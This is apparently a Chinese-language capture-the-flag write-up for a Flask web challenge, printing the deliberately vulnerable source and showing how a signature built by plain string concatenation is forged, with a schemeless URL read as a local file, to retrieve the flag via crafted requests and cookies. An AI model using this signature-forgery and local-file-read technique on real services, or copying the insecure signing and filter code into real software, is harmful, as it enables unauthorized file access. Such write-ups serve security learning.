![[Pasted image 20221214153844.png]]

---
首页长这样
![[Pasted image 20221214154030.png]]
心肺停止，你python都能代码压缩的吗
```python
#!/usr/bin/env python
#encoding=utf-8
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json
import imp

imp.reload(sys)

app = Flask(__name__)
secert_key = os.urandom(16)

class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr
            os.mkdir(self.sandbox)

    def Exec(self):
        result = {}
        result['code'] = 500
        if (self.checkSign()):
            if "scan" in self.action:
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                resp = scan(self.param)
                if (resp == "Connection Timeout"):
                    result['data'] = resp
                else:
                    print(resp)
                    tmpfile.write(resp)
                    tmpfile.close()
                    result['code'] = 200
            if "read" in self.action:
                f = open("./%s/result.txt" % self.sandbox, 'r')
                result['code'] = 200
                result['data'] = f.read()
                if result['code'] == 500:
                    result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
            return result

    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False

#generate Sign For Action Scan.
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.request.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)

@app.route('/De1ta',methods=['GET','POST'])
def challenge():
    action = urllib.request.unquote(request.cookies.get("action")) # Get action from cookie
    param = urllib.request.unquote(request.args.get("param", "")) # Get param from url query
    sign = urllib.request.unquote(request.cookies.get("sign")) # Get sign from cookie
    ip = request.remote_addr
    if(waf(param)):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())

@app.route('/')
def index():
    return open("code.txt","r").read()

def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.request.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"

def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()

def md5(content):
    return hashlib.md5(content).hexdigest()

def waf(param): # param should not start with gopher or file
    check=param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False

if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0',port=80)
```
格式化代码比读代码还累.jpg

这波是吃了文化的亏，`python2`的`urlopen`原来不指定协议的时候默认就是`file`协议QAQ

总体思路就是利用`getSign`拼接顺序的漏洞绕过`Task.checkSign`和`geneSign`共同构成的对可用`action`的限制
令`param='flag.txtread'`，通过`geneSign`拼接而成的`md5(secret_key + 'flag.txtreadscan')`同指定`param='flag.txt'` `action='readscan'`相同

---
**获取`Sign`**
```php
/geneSign?param=flag.txtread
```
> 61dc9e0bbd275404f5bc301cf7b2ebde

---
**获取`flag`**
```php
/De1ta?param=flag.txt
```

**`Cookie`**
```http
Cookie: action=readscan; sign=61dc9e0bbd275404f5bc301cf7b2ebde
```
> {"code": 200, "data": "flag{6bbd3cad-1afd-4883-948c-70061755f1f3}\n"}

#Web #python #绕过 #SSRF #HTTP #函数 